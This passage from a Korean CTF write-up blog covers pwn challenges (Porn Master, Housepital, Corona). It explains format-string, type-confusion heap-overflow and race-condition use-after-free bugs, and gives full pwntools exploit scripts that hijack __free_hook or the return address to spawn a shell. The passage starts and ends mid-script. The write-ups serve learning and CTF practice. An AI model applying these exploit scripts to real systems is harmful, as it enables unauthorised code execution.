<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x481</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">"ls"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" - "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" - "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" - "</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">f"leak: 0x</span><span class="si">{</span><span class="n">leak</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="mh">0x110</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x361</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">oob</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="s">'AA'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"vim /bin/sh"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"i"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h2 id="porn-master">Porn Master</h2>

<hr />

<p><img src="/assets/bob/bob969.png" alt="/assets/bob/bob969.png" /></p>

<p>Format String Bug를 이용한 stack 영역 변조 및 쉘 획득 (glibc 2.27)</p>

<ul>
  <li>보호기법</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
</code></pre></div></div>

<ul>
  <li>실행결과</li>
</ul>

<p><img src="/assets/bob/bob970.png" alt="/assets/bob/bob970.png" /></p>

<ul>
  <li>코드확인</li>
  <li>사용자에게 name 을 0x64 사이즈만큼 입력을 받으며 힙 영역에 저장을 한다.</li>
  <li>또한, 사용자에게 0x18 사이즈만큼 입력을 받아 스택에 저장하며, 입력과 출력을 각 2번씩 수행하는 것을 확인할 수 있다. 해당영역에서 <code class="highlighter-rouge">FSB</code> 취약점이 발생하는 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob971.png" alt="/assets/bob/bob971.png" /></p>

<ul>
  <li>취약점이 발생하는 <code class="highlighter-rouge">printf</code> 에 브레이크포인트 지정 후 디버거 확인</li>
  <li>디버거를 통해 스택을 확인할 시 <code class="highlighter-rouge">0x00007ffd8e961198</code> 주소가 <code class="highlighter-rouge">0x00007ffd8e96118c</code> (변수 i)를 가리키는 포인터 변수(idx)인 것을 확인할 수 있다. 즉, 해당영역을 FSB를 통해 변조할 시 무제한으로 입출력 할 수 있다.</li>
  <li>따라서, stack 및 libc leak 이후 ret 를 oneshot 으로 변조하여 exploit 할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob972.png" alt="/assets/bob/bob972.png" /></p>

<ul>
  <li>exploit code</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">bi</span> <span class="o">=</span> <span class="s">'./pwn'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">bi</span><span class="p">])</span>
<span class="c1">#r = remote('localhost', 12002)
</span>
<span class="k">def</span> <span class="nf">reset</span><span class="p">():</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="s">'%11$n'</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span> <span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'gpsfly'</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">'%17$p'</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span> <span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x21b97</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)))</span>
<span class="n">reset</span><span class="p">()</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">'%11$p'</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc</span> <span class="o">+</span> <span class="mh">0x48</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)))</span>
<span class="n">reset</span><span class="p">()</span>

<span class="n">oneshot</span> <span class="o">=</span> <span class="n">libc</span><span class="o">+</span><span class="mh">0x4f2c5</span>
<span class="n">oneshot</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">oneshot</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="s">'%{}c%14$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">oneshot</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s">'A'</span><span class="p">)</span>
    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="n">i</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
    <span class="n">reset</span><span class="p">()</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h2 id="housepital">Housepital</h2>

<hr />

<p><img src="/assets/bob/bob973.png" alt="/assets/bob/bob973.png" /></p>

<ul>
  <li>보호기법</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
</code></pre></div></div>

<ul>
  <li>실행결과</li>
  <li>해당 바이너리는 <code class="highlighter-rouge">add</code>, <code class="highlighter-rouge">view</code>, <code class="highlighter-rouge">delete</code> 3가지 기능이 있으며 힙 영역에 메모리를 할당하여 쓰고, 읽고, 해제할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob974.png" alt="/assets/bob/bob974.png" /></p>

<ul>
  <li>구조체 확인</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">struct</span> <span class="n">Patient</span>
<span class="p">{</span>
    <span class="n">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x24</span><span class="p">];</span> <span class="c1"># 24 bytes
</span>    <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">age</span><span class="p">;</span> <span class="c1"># 4 bytes
</span>    <span class="n">size_t</span> <span class="n">gender</span><span class="p">;</span> <span class="c1"># 8 bytes
</span>    <span class="n">char</span> <span class="o">*</span><span class="n">sickness</span><span class="p">;</span> <span class="c1"># 8 bytes
</span><span class="p">};</span>
</code></pre></div></div>

<ul>
  <li>취약점 확인 (add function)</li>
  <li>25 line 에 scanf 함수 호출 시 <code class="highlighter-rouge">%lld</code> 포맷은 8 바이트 입력을 받으며, patient_list[i]→age 변수는 unsigned int (4 바이트)형 변수 이므로 해당 코드에서 <code class="highlighter-rouge">Type Confusion</code> 이 발생한다.</li>
  <li>이를 통해 아래 26 line 및 47 line 을 통해 0x40 chunk 를 할당받아 0x80 사이즈 만큼 입력을 받는 등 <code class="highlighter-rouge">Heap Overflow</code>로 악용 가능하다.</li>
</ul>

<p><img src="/assets/bob/bob975.png" alt="/assets/bob/bob975.png" /></p>

<ul>
  <li>exploit plan
    <ol>
      <li>
        <p>libc leak</p>

        <p>1.1. 0x420 이상의 청크를 만든 뒤 free 하여 <code class="highlighter-rouge">unsorted bin</code> (libc-main_arena) 생성</p>

        <p>1.2. view 메뉴를 통해 libc 주소 leak</p>
      </li>
      <li>
        <p>rip 변조</p>

        <p>2.1. tcache bin 의 fd 를 <code class="highlighter-rouge">__malloc_hook</code> 또는 <code class="highlighter-rouge">__free_hook</code> 주소로 변조</p>

        <p>2.2. tcache chunk 할당 시 <code class="highlighter-rouge">oneshot</code> 또는 <code class="highlighter-rouge">system</code> 주소로 변조</p>

        <p>2.3. malloc 또는 free 함수를 호출하여 트리거</p>

        <ul>
          <li>__free_hook 을 system 주소로 변조 하였을 경우 힙 메모리에 <code class="highlighter-rouge">"/bin/sh"</code> 문자열 저장 후 호출</li>
        </ul>
      </li>
    </ol>
  </li>
  <li>exploit code</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">bi</span> <span class="o">=</span> <span class="s">'./pwn'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">bi</span><span class="p">])</span>
<span class="c1">#r = remote('localhost', 12003)
</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bi</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc.so.6'</span><span class="p">)</span>
<span class="n">xla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">xa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">gender</span><span class="p">,</span><span class="n">age</span><span class="p">,</span><span class="n">sickness</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="s">'1'</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">gender</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">age</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">sickness</span><span class="p">)]</span>
<span class="n">view</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="s">'2'</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">)]</span>
<span class="n">dele</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="s">'3'</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">)]</span>

<span class="p">[</span><span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>

<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>
<span class="p">[</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>
<span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x40</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000000ff</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span>
<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000000ff</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">view</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'sickness : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x70</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)))</span>

<span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x40</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">])</span>
<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000000ff</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>

<span class="p">[</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]),</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'/bin/sh'</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>추가적으로, 개발 실수로 인해 add 함수에 힙 메모리 할당 시 해당 영역으로 초기화(memset 또는 calloc) 하지 않아 <code class="highlighter-rouge">Uninitialized Heap</code> 버그가 존재하니 해당 버그를 이용하여 exploit 해보는것도 추천한다.</li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="corona">Corona</h2>

<hr />

<p><img src="/assets/bob/bob976.png" alt="/assets/bob/bob976.png" /></p>

<p>race condition을 이용한 thread heap exploit challenge.</p>

<h3 id="challenge">Challenge</h3>

<p>사용할 수 있는 메뉴는 아래와 같다.</p>

<ol>
  <li>Create house : house structure 할당</li>
  <li>Edit house : house name 수정</li>
  <li>Add person : person structure 할당</li>
  <li>Check status : person 상태 출력</li>
  <li>hidden : person name 수정 (한번만 호출 가능)</li>
</ol>

<p>또한 프로그램에는 두개의 thread가 동작하고 있다.</p>

<ol>
  <li>t_virus : 랜덤(3 + rand()%8)으로 사람을 한명 감염시키고 person chunk를 free 한다.</li>
  <li>t_day_check : 5초에 한번씩 하루가 지나며 하루가 지날 때 마다 감염된 person 객체를 null로 덮어쓴다.</li>
</ol>

<h3 id="vulnerability">Vulnerability</h3>

<p>취약점은 race condition으로, t_virus 쓰레드가 person chunk를 free한 후 t_day_check 쓰레드가 person list를 free하기 전에 free된 person 에 접근하면 Use-After-Free 취약점이 발생한다.</p>

<h3 id="exploit-1">Exploit</h3>

<p>exploit에 앞서 이 문제를 최대한 빠르게 exploit하기 위해 알고있어야하는 두가지가 있다.</p>

<ol>
  <li>바이너리에서 chunk를 free하는게 자유롭지 않다. t_virus thread가 랜덤으로 free하는데, list에 chunk가 없을 경우 free되지 않을 수도 있다. 따라서 chunk를 최대한 높은 확률로 free시키기 위해서는 모든 house에 person을 전부 채우고 free 될 때 출력되는 메세지로 어떤 청크가 free된건지 구분하는게 좋다 (<code class="highlighter-rouge">printf("\n%s was infected ...\n", house_list[rd]-&gt;list[i]-&gt;name);</code>)
그래서 exploit을 작성할 때도 특수한 chunk가 free되는걸 가정하기 보다, 단순히 chunk가 free되는 사실을 이용해 코드를 작성해야 한다. 그렇지 않으면 랜덤 때문에 디버깅이 매우 힘들고 exploit을 완성하는데 오랜 시간이 걸릴 것이다.</li>
  <li>race를 내는 시간이 너무 길다. t_day_check가 5초이고 t_virus가 (rand()%8 + 3)초인데 사실상 chunk 하나가 free되기 위해서는 최소 3초를 기다려야한다는 말이 된다. 문제를 풀 때는 바이너리 패치로 이 값을 짧게 줄여서 exploit해야 디버깅하는데 시간을 최소화할 수 있다.</li>
</ol>

<p>아마 위 두가지를 안했다면 디버깅이 매우 불편했을 것이다. 다음은 실제로 exploit하는 순서이다.</p>

<ol>
  <li>5일째에 libc leak을 제공해 준다.</li>
  <li>t_virus로 8개의 chunk를 free한다. (7개의 chunk는 tcache에 저장되며 마지막 chunk는 fastbin에 저장된다.)</li>
  <li>hidden 메뉴를 이용해 fastbin chunk의 fd를 free hook - 0x10으로 돌린다. (race condition 트리거)</li>
  <li>동일한 사이즈의 청크를 하나 더 할당하면 fastbin chunk를 tcache bin 으로 옮긴다.</li>
  <li>tcache bin에 있는 chunk를 할당받아 free_hook에 원하는 값을 쓴다.</li>
  <li>person name에 /bin/sh를 넣어 t_virus가 chunk를 free할 때 shell을 획득한다.</li>
</ol>

<h3 id="note">Note</h3>

<p>사실 이 문제를 처음 기획했을때 핵심적인 내용은 libc 주소를 leak하는 부분이었다. 다만 libc를 leak하는 방법이 생각보다 너무 어려워져서 이것과 함께 tcache bin trick을 같이 낸다면 푸는데 너무 많은 시간이 걸릴것이라 판단했다. 그래서 libc 주소를 주는 방향으로 문제를 변경했고, exploit에서 안쓰는 edit house 메뉴가 있는 이유도 leak을 주는걸로 패치해서 그렇다. (하지만 지금 문제에서도 libc leak을 할 수 있으니 도전해보고 싶으신 분들은 도전해 보시길..)</p>

<p>그리고 exploit의 핵심적인 내용 중에 tcache 관련 트릭이 있는데, 사실 이것은 공개적으로 알려지거나 흔히 사용되는 트릭은 아닌 만큼 fastbin bin에 있는 chunk가 tcache으로 옮겨진다는 사실을 모르는 분들이 많을 것이라 생각했다. 특히 CTF에서 heap 관련 문제는 모르는 트릭이 나와 고생하는 경우가 많은데, 이 문제에서는 트릭을 몰라도 자연스럽게 문제를 풀 수 있도록 최대한 유도했다.</p>

<p>그 부분이 바로 Person chunk를 0x70 사이즈의 chunk로 줬다는 사실인데, exploit에서 tcache bin 트릭을 사용하면 사이즈와는 상관 없이 원하는 주소를 덮어 쓸 수 있다. 하지만 이 사실을 모르는 분들은 이미 흔하게 알려진 0x70 fastbin chunk의 fd를 덮어 __malloc_hook을 덮어쓰는 exploit을 생각했을 것이다. 만약 이런 생각을 통해 exploit을 작성했다 하더라도 __malloc_hook을 덮어쓰는 과정에서 자연스럽게 fastbin chunk가 tcache bin으로 옮겨지는 사실을 확인할 수 있을 것이다. 여기서 좀만 더 디버깅을 하다 보면 exploit을 완성할 수 있도록 문제를 설계했다. 그래서 이 문제를 푸는 모든 분들이 모르면 못푸는 트릭문제라고 생각하지 않았으면 좋겠다는 마음으로 최대한 익스 유도를 해봤다.</p>

<h3 id="exploit-code">Exploit Code</h3>

<p>실수로 문제 코드와 exploit을 다 날려버린 바람에,, 문제를 크로스 체킹 해주신 핵심연구팀 김동민님(@gpsfly) 익스를 첨부한다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">bi</span> <span class="o">=</span> <span class="s">'./bin.elf'</span>
<span class="c1">#r = process([bi])
</span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'bob.lordofpwn.kr'</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
<span class="n">sla</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span>
<span class="n">sa</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">pause</span>
<span class="n">dbg</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bi</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc'</span><span class="p">)</span> <span class="c1"># remote
#l = ELF('libc.so.6') # local
</span>
<span class="n">sc</span> <span class="o">=</span> <span class="s">'''
heap-analysis-helper
c
'''</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">dbg</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span>

<span class="n">xla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">xa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">sa</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">create</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">)]</span>
